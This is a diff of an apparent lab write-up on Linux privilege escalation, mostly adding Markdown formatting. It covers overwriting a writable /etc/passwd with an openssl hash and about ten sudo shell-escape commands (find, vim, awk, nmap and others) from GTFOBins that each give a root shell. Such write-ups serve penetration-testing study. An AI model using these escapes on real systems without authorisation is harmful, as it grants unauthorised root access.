@@ -80,24 +80,24 @@ after successfully generate hash place it to the hash place login with password 
 
 
 As passwd file is writable so we use this and generate password hash with the command 
-openssl passwd {NewPasswordHere}
+`openssl passwd {NewPasswordHere}`
 
 After the replace the password hash that you generated into "x" singn in passwd file 
 Then you can login into root user with that password that you use to generate hash 
-------------Allternative--------------------
+#### Allternative
 Copy the root user line and append it with the end of the file and change root with newroot and replace the hash with "x" sign in passwd file 
 Now to change the user into newroot with that password that you use to generate hash  
 
-============================================
-Sudo - Shell Escape Sequences 
-==============================
+
+### Sudo - Shell Escape Sequences 
+
 
 list programs which sudo allows your user to run using command 
 
-sudo -l
+`sudo -l`
 
-In my target user case they are 
-
+In my target user they are 
+```
 User user may run the following commands on this host:
     (root) NOPASSWD: /usr/sbin/iftop
     (root) NOPASSWD: /usr/bin/find
@@ -110,9 +110,9 @@ User user may run the following commands on this host:
     (root) NOPASSWD: /usr/bin/nmap
     (root) NOPASSWD: /usr/sbin/apache2
     (root) NOPASSWD: /bin/more
+```
 
-
-that command are allow to my Target user
+that command are allow to Target user
 
 Using the link: https://gtfobins.github.io/  
 GTFObins list if we found the command in that list that sudo allow on the user we can gain root shell with only Escape sequence mention in GTFObins list 
@@ -120,64 +120,64 @@ GTFObins list if we found the command in that list that sudo allow on the user w
 So now try gain root shell of all the command that sudo allow on my target user using GTFObins list 
 
 1) iftop
-Command: sudo iftop
-!/bin/sh
+Command: ```sudo iftop
+!/bin/sh```
 
 write that command and we foung root shell
 
 2) find 
-Command: sudo find . -exec /bin/sh \; -quit
+Command: `sudo find . -exec /bin/sh \; -quit`
 
 write that command and we foung root shell
 
 3) nano
 To esclate the privilege using nano first use command "sudo nano"
 After that when nano text editor is open press "ctrl+r" and after that press "ctrl+x" 
-Then type "reset; sh 1>&0 2>&0" and press enter and you have root shell NOTE: type without double qotation marks (")
+Then type `reset; sh 1>&0 2>&0` and press enter and you have root shell NOTE: type without double qotation marks (")
 
 4) vim 
-Command: sudo vim -c ':!/bin/sh'
+Command: `sudo vim -c ':!/bin/sh'`
 Write that command and you gain root access
 5)man 
 Commands:
-         sudo man man
-         !/bin/sh
+        ``` sudo man man
+         !/bin/sh```
 use this commands to gain root access
 
 6) awk 
 
-Command: sudo awk 'BEGIN {system("/bin/sh")}'
+Command:` sudo awk 'BEGIN {system("/bin/sh")}'`
 
 Write that command and you gain root access
 
 7) less 
-Commands: less /etc/profile
-          !/bin/sh
+Commands: ```less /etc/profile
+          !/bin/sh```
 
 use this command to gain root access
 
 8) ftp
 Commands:
-         ftp
-         !/bin/sh 
+        ``` ftp
+         !/bin/sh ```
 use this command to gain root privilege
 
 9) nmap
 Commands: 
-sudo nmap --interactive
+```sudo nmap --interactive
 nmap> !sh
-
+```
 use this command to gain root access
 
 10) more
 Commands: 
-         TERM= sudo more /etc/profile
-         !/bin/sh
+        ``` TERM= sudo more /etc/profile
+         !/bin/sh```
 use this commands to gain root access
-=========================================
-These are all the command that are allow my target user account and with the help of GTFObins we successfully gain root access 
 
-one command are allow on my target user account but there exploit not found in GTFObins and they are 
- "apache2" 
-=================================================================================================================================================================================
-TO Be Continued...
+These are all the command that are allow target user account and with the help of GTFObins we successfully gain root access 
+
+one command are allow on target user account but there exploit not found in GTFObins and they are 
+ `apache2`
+
+# TO Be Continued...
